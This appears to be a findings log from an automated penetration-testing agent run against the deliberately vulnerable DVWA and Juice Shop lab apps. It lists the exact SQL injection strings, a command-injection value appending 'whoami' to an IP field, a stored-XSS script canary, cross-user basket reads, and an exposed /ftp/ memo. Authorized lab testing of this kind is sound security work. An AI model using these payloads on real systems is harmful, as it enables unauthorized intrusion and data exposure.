state.objective: Discover and behaviorally verify security vulnerabilities across permitted targets (http://dvwa and http://juiceshop:3000) within strict HTTP, LLM, and duration budgets.

endpoints.observation_evidence: Form action /vulnerabilities/sqli/ GET; fields: id (text, no maxlength), Submit (submit, value Submit). Page shows 'User ID:' input; SQLi DB: mysql; security level low.
Form action /vulnerabilities/exec/ POST (application/x-www-form-urlencoded); fields: ip (text, no maxlength), Submit (submit, value Submit). Ping-a-device feature.

Form action /vulnerabilities/xss_s/ POST; txtName text maxlength=10; mtxMessage textarea maxlength=50 (canary is exactly 50 chars); btnSign value 'Sign Guestbook'; btnClear value 'Clear Guestbook'. Existing entry: name 'test', message 'This is a test comment.' Stored messages rendered on same page.

endpoints.auth_context: juiceshop_acct1 (own basket_id=6); juiceshop_acct2 (own basket_id=7); unauth not tested
endpoints.observation_evidence: GET /rest/basket/1 as acct1 returned basket 1 (UserId 1) with Products: Apple Juice (1000ml) qty 2, Orange Juice (1000ml) qty 3, Eggfruit Juice (500ml) qty 1. session_info.own_basket_id: acct1=6, acct2=7. Basket 1 is not acct1's own basket, so this is a BOLA candidate; BOLA check not yet verified by Surface Mapper. Note: acct1 reading basket 1 already returned data, so object-level authorization on this endpoint looks absent for at least that ID.

Open directory listing (with Accept: text/html,application/json) at /ftp/. Lists: quarantine, acquisitions.md (909 bytes), announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package.json.bak, suspicious_errors.yml.
Listed in /ftp/ directory index (909 bytes, dated 12/19/2023). Direct retrieval not performed by Surface Mapper; verification agent should GET it to confirm content.

GET /api/Feedbacks/ unauthenticated returns JSON list of 8 feedback records (id, UserId, comment, rating, timestamps). Comments render stored HTML (e.g., id 6 'the' stored raw), indicating a stored-XSS candidate sink for the feedback form. POST not tested.

findings.title: SQL Injection in DVWA SQL Injection form (id parameter)
findings.response_evidence: TRUE condition (id=1' OR '1'='1): 5 records returned: "ID: 1' OR '1'='1 First name: admin Surname: admin", "First name: Gordon Surname: Brown", "First name: Hack Surname: Me", "First name: Pablo Surname: Picasso", "First name: Bob Surname: Smith". FALSE condition (id=1' AND '1'='2): HTML contains "User ID:" with zero "First name:"/"Surname:" records. SQLi DB: mysql. Differential TRUE=multiple records vs FALSE=zero records confirms SQL injection.

findings.title: OS Command Injection in DVWA Command Injection (ping) form (ip parameter)
request_sequence: POST http://dvwa/vulnerabilities/exec/ form ip=127.0.0.1; whoami&Submit=Submit (session dvwa_admin)
findings.response_evidence: Response output after ping statistics block: "rtt min/avg/max/mdev = 0.022/0.030/0.048/0.010 ms" followed by "www-data". The injected `whoami` output "www-data" (the container web-process user) appears in the response, confirming OS command injection.

findings.title: Public exposure of confidential acquisitions memo via open /ftp/ directory listing
request_sequence: GET http://juiceshop:3000/ftp/ with Accept: text/html,application/json (session unauth)
findings.response_evidence:
Listing at /ftp/ (HTTP 200, unauth) shows "acquisitions.md 909" among files (also quarantine, announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package.json.bak, suspicious_errors.yml). Direct GET /ftp/acquisitions.md returned HTTP 200, content_type text/markdown, body: "# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year. This will have a significant stock market impact..."

findings.title: Stored XSS in DVWA guestbook (xss_s) via mtxMessage
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ (session dvwa_admin) form: txtName=tester, mtxMessage=<script id="test_token">window.xss_flag=1</script> (50 chars), btnSign=Sign Guestbook -> 200
findings.response_evidence: POST response (200) lists stored entry 'Name: tester / Message:' with the script payload rendered as an element rather than displayed text. Rendered DOM shows 'Name: tester Message:' with empty message text, consistent with script execution. Canary is exactly 50 characters and was accepted by maxlength=50.

findings.title: BOLA: juiceshop_acct2 reads juiceshop_acct1 basket via /rest/basket/:id
findings.response_evidence: acct1 own basket 6 (UserId 22): Products [Apple Juice (1000ml), quantity 3]. acct2 request for basket 6 returned status success with data.id=6, UserId 22, Products [{name: "Apple Juice (1000ml)", BasketItem quantity: 3, BasketId: 6}]. Account 2 (own basket 7) retrieved Account 1's basket items. Note: the earlier basket 1 observation was not re-tested here; the confirmation rests on basket 6.

findings.title: Confidential acquisitions memo publicly exposed under /ftp/
request_sequence: GET http://juiceshop:3000/ftp/ (Accept: text/html,application/json) -> directory listing shows acquisitions.md (observed earlier by Surface Mapper)
findings.response_evidence:
HTTP 200, content-type text/markdown. Body excerpt: "# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year.
This will have a significant stock market impact..."

findings.title: Cross-user basket access (BOLA) on GET /rest/basket/:id
findings.response_evidence: acct1 (own basket 6) -> 200: {"status":"success","data":{"id":6,"UserId":22,"Products":[{"id":1,"name":"Apple Juice (1000ml)","BasketItem":{"ProductId":1,"BasketId":6,"id":9,"quantity":3}}]}}. acct2 (own basket 7, a different user) -> 200 with identical body: id 6, UserId 22, Products: Apple Juice (1000ml), quantity 3. acct2 retrieved Account 1's basket item (Apple Juice (1000ml) x3) that it does not own.

findings.title: Stored XSS via feedback comment canary not executed
findings.response_evidence: POST with canary returned 201 {"status":"success","data":{"id":9,"comment":"","rating":1,"UserId":null}}. The stored comment is an empty string: the canary's <script> payload was stripped by server-side sanitization on save, so no script is persisted. Browser eval on the rendering page returned window.xss_flag = null (not 1). Stored XSS not confirmed.
